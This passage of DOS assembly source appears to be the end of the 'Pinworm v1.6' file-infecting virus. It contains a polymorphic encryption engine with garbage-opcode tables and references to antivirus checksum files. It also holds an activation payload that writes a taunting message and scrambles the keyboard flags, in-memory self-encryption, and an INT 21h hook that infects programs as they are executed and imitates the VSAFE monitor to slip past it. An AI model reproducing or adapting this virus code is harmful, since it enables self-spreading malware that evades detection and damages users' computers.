	mov     ah,2ch                  ; get clock
	int     21h
	mov     ran_seed,dx
	pop ax
	ret

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Get Random Number °°°°°°°°°°°°°°°°°°°°°
;  AX=max number
;  ret: DX=random #  [will not return 0]
;  ROUTINE PARTIALLY FROM: TP6.0 BOOK
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
random:
	push ax
	mov ax,ran_seed
	mov cx,31413
	mul cx
	add ax,13849
	mov ran_seed,ax
	pop cx
	mul cx
	cmp dx,0
	jnz ran_ok
	inc dx
ran_ok:
	ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Associated bullshit
;
chkl1   db      'CHKLIST.MS',0          ; MSAV shitty checksum
chkl2   db      'CHKLIST.CPS',0         ; CPAV shitty checksum
pin_dir db      255,'PIïWérM.ûg!',0     ; DIR created
root    db      '..',0                  ; for changing to org. dir
act_file db     'VIROGEN.MSG',0
act_data db     ' Thank you for allowing Pinworm v1.6 to reside within your computer! You will',cr
         db     'be rewarded for your kindness by the gods which reign over the cyber world.',cr
         db     'You may thank the holy god of heart and kindness, ûirogen, for bringing this',cr
         db     'life into the cold and dead realms of your computer.',cr,cr
         db     '-----BEGIN PGP PUBLIC KEY BLOCK-----',cr
         db     'Version: 2.6',cr,cr
         db     'mQCNAixt9g4AAAEEANN3KDJ5NjmN1bm5cQGs352wJsQH6FBtOgnHEpZczJBXBwU1',cr
         db     'HiMIL0a4ST16h/flarD2Jsekk5KMz0XF0/+ZAy98Ng3AglsWT+9mXnYxlnUwMaIc',cr
         db     '0QeCU8ECQzQSRzSznWidEKsemYLC179eOEfOqNeYR5NndCo3mVS0HwB6IcbpAAUR',cr
         db     'tAdWaXJvZ2Vu',cr
         db     '=Hvsw',cr
         db     '-----END PGP PUBLIC KEY BLOCK-----',0
activate db     0
isav    db      0
new_jmp db      0E9h,0,0,0              ; jmp XXXX ,0 (id)

ran_seed dw 0
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Polymorphic engine data °°°°°°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
inc_op_ptr dw   offset inc_buf          ; ptr to location of INC
enc_op_ptr dw   offset enc_op_buf       ; actual ENC op ptr
ptr_op_ptr dw   offset ptr_buf          ; ptr to ptr set pos
count_op_ptr dw offset cnt_buf          ; ptr to counter reg pos
dec_op_ptr dw   offset dj_buf           ; ptr to decrement counter op pos
inc_op_ptr2  dw 0
seg_op  db      2Eh                     ; CS
w_b     db      80h                     ; byte=80h word=81h
dec_type db     2Ch                     ; SUB BYTE PTR CS:[DI|SI],XXXX
enc_num db      0
enc_type db     2Ch
ptr_set db      0BEh                    ; MOV DI|SI,XXXX
rel_off dw      real_start+100h
count_op db     0B8h                    ; MOV AX|BX|CX|DX,XXXX
crypt_bytes dw  offset vend-offset dj_buf
dec_op: dec     ax                      ; DEC AX|BX|CX|DX
jnz_op  db      75h,0
;loop_op db      0E2h                    ; LOOP XX
loop_ofs db     0
cons_byte dw    0
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° One-byte Garbage Operands (must be 16)°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

nops_1:   nop
IF INCLUDE_INT3
	int     3
ELSE
	cld
ENDIF
	into
	inc     bp
	dec     bp
	cld
	nop
	stc
	cmc
	clc
	stc
	into
	cli
	sti
	inc     bp
IF INCLUDE_INT3
	int     3
ELSE
	nop
ENDIF

IF TWO_BYTE
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Two-byte Garbage Operands (must be 16)°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
nops_2: db 0EBh,0    ; JMP $+2
	db 74h,0     ; JZ $+2
	db 75h,0     ; JNZ $+2
	db 7Ch,0     ; JL $+2
	db 7Fh,0     ; JG $+2
	db 72h,0     ; JC $+2
	or bp,bp
	not bp
	neg bp
	mov bp,ax
	mov bp,dx
	mov bp,si
	mov bp,di
	mov si,si
	mov di,di
	xchg cx,cx
ENDIF

; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; °°°°°°° Activation Routine °°°°°°°°°°°°°°°°°°°°
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Creates directory named after Pinworm and files
; in that directory which together form a message.
;
act_routine:
	push    ax bx cx ds dx bp es cs
	pop     ds
	mov     activate,0              ;we're in work now..
	lea     dx,pin_dir              ;create our subdirectory
	mov     ah,39h
	int     21h
	mov     ah,3bh                  ;change to our new subdirectory
	int     21h
        lea     dx,act_file
        xor     cx,cx
        mov     ah,3ch
        int     21h
        xchg    ax,bx
        lea     dx,act_data
        mov     cx,(offset activate-offset act_data)
        mov     ah,40h
        int     21h
        mov     ah,3eh
        int     21h

        lea     dx,root                 ; change back to orginal dir
        mov     ah,3bh
        int     21h

        cmp     r_delay,5               ;5 calls?
        jl      r_no                    ;if not then skip keyboard ror
        mov     r_delay,-1
        xor     ax,ax                   ;es=null
        mov     es,ax
        ror     word ptr es: [416h],1   ;rotate keyboard flags
r_no:
	inc     r_delay                 ;increment calls count
	mov     activate,1
	pop     es bp dx ds cx bx ax
	jmp     no_act

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Interrupt 24h - critical error handler
;
new_24:                                 ; critical error handler
	mov     al,3                    ; prompts suck, return fail
	iret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; In-memory encryption function
;  **virus encrypted in memory up to this point**
;
mem_crypt:
	mov     cx,offset mem_crypt-offset code_start
	xor     di,di                   ;offset 0
mem_loop:
	db      2Eh,81h,35h             ;CS:XOR WORD PTR [DI],
mem_word dw     0                       ;XXXX
	inc     di
	loop    mem_loop
	ret

;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; Interrupt 21h
;  returns SI=0 and passes control to normal handler if
;   VSAFE uninstall command is recieved.
;
new21:
	pushf

	cmp     cs: activate,1          ; time to activate?
	jnz     no_act
	cmp     ah,0Bh
	jl      act_routine
no_act:
	cmp     ax,signal               ; be it us?
	jnz     not_us                  ; richtig..
	cmp     dx,vsafe_word
	jnz     not_us
	xor     si,si                   ; tis us
	mov     di,4559h                ; simulate VSAFE return
not_us:
	cmp     ah,4bh                  ; execute phile?
	jnz     jmp_org

go_now: push    ax bp bx cx di dx ds es si
	call    mem_crypt               ; decrypt in memory
	call    infect_file             ; the mother of all calls
	call    mem_crypt               ; encrypt in memory
	pop     si es ds dx di cx bx bp ax

	jmp_org:
	popf
	db      0eah                    ; jump far
	old21   dd 0                    ; O:S


exe_header:
org_bytes db    0CDh,20h,0,0            ; original COM bytes | exe hdr
;ÄÄÄÄ Start of heap (not written to disk)
heap:
db      14h     dup(0)                  ; remaining exe header space
old_24_off dw   0                       ; old int24h vector
old_24_seg dw   0
r_delay db      0
size_disp db    0                       ; additional size of virus
vend:                                   ; end of virus in memory..
cseg    ends
	end     start

